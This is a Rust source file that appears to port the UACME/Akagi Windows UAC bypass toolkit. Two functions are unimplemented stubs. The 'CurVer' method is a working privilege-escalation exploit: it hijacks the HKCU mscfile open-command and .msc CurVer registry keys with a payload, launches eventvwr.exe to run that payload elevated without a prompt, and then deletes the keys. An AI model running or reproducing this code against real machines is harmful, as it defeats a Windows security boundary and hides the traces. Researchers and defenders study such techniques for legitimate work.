// COM-based UAC bypass support functions
// Port of Source/Akagi/methods/comsup.c

use shared::*;
use windows::core::PCWSTR;

/// Allocate elevated COM object
/// This is used by many methods to get elevated COM interfaces
pub fn allocate_elevated_object(
    clsid: &str,
    iid: &str,
) -> Result<*mut std::ffi::c_void, String> {
    log::warn!("COM object allocation not fully implemented");
    
    // This requires:
    // 1. CoCreateInstance with CLSCTX_LOCAL_SERVER
    // 2. Bind to elevated COM object
    // 3. QueryInterface for desired interface
    
    Err("Not implemented".to_string())
}

/// Method 69: PCA
/// Bypass UAC using Program Compatibility Assistant
pub fn method_pca(ctx: &mut crate::context::UacmeContext, _params: &crate::methods::MethodParams) -> crate::methods::MethodResult {
    log::info!("[Method 69] PCA");

    log::warn!("PCA method not fully implemented");
    constants::STATUS_NOT_IMPLEMENTED
}

/// Method 70: CurVer
/// Bypass UAC using CurVer registry manipulation
pub fn method_curver(ctx: &mut crate::context::UacmeContext, _params: &crate::methods::MethodParams) -> crate::methods::MethodResult {
    log::info!("[Method 70] CurVer");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    curver_registry_hijack(&payload_str)
}

/// CurVer registry hijack
fn curver_registry_hijack(payload: &str) -> crate::methods::MethodResult {
    use windows::Win32::System::Registry::*;
    use windows::Win32::Foundation::*;
    
    // HKCU\Software\Classes\mscfile\shell\open\command
    let reg_path = to_wide_string("Software\\Classes\\mscfile\\shell\\open\\command");
    
    unsafe {
        let key_result = winapi_ext::RegistryKey::create(
            HKEY_CURRENT_USER,
            &reg_path,
            KEY_WRITE.0,
        );
        
        let key = match key_result {
            Ok(k) => k,
            Err(e) => {
                log::error!("Failed to create registry key: {}", e);
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        let payload_wide = to_wide_string(payload);
        let empty_wide = to_wide_string("");
        
        if key.set_string_value(&empty_wide, &payload_wide).is_err() {
            return constants::STATUS_ACCESS_DENIED;
        }
        
        // Modify CurVer to point to our mscfile
        let curver_path = to_wide_string("Software\\Classes\\.msc");
        let curver_key = match winapi_ext::RegistryKey::create(
            HKEY_CURRENT_USER,
            &curver_path,
            KEY_WRITE.0,
        ) {
            Ok(k) => k,
            Err(_) => {
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        let curver_name = to_wide_string("CurVer");
        let curver_value = to_wide_string("mscfile");
        
        if curver_key.set_string_value(&curver_name, &curver_value).is_err() {
            return constants::STATUS_ACCESS_DENIED;
        }
        
        // Launch eventvwr.exe
        let sys_dir = query_system_directory(true);
        let sys_dir_str = from_wide_string(&sys_dir);
        let eventvwr = format!("{}eventvwr.exe", sys_dir_str);
        
        let result = match winapi_ext::create_process_simple(&to_wide_string(&eventvwr), None, 1) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                std::thread::sleep(std::time::Duration::from_secs(3));
                constants::STATUS_SUCCESS
            }
            Err(_) => constants::STATUS_ACCESS_DENIED,
        };
        
        // Cleanup
        let mscfile_path = to_wide_string("Software\\Classes\\mscfile");
        let _ = RegDeleteTreeW(HKEY_CURRENT_USER, PCWSTR(mscfile_path.as_ptr()));
        
        let msc_path = to_wide_string("Software\\Classes\\.msc");
        let _ = RegDeleteTreeW(HKEY_CURRENT_USER, PCWSTR(msc_path.as_ptr()));
        
        result
    }
}

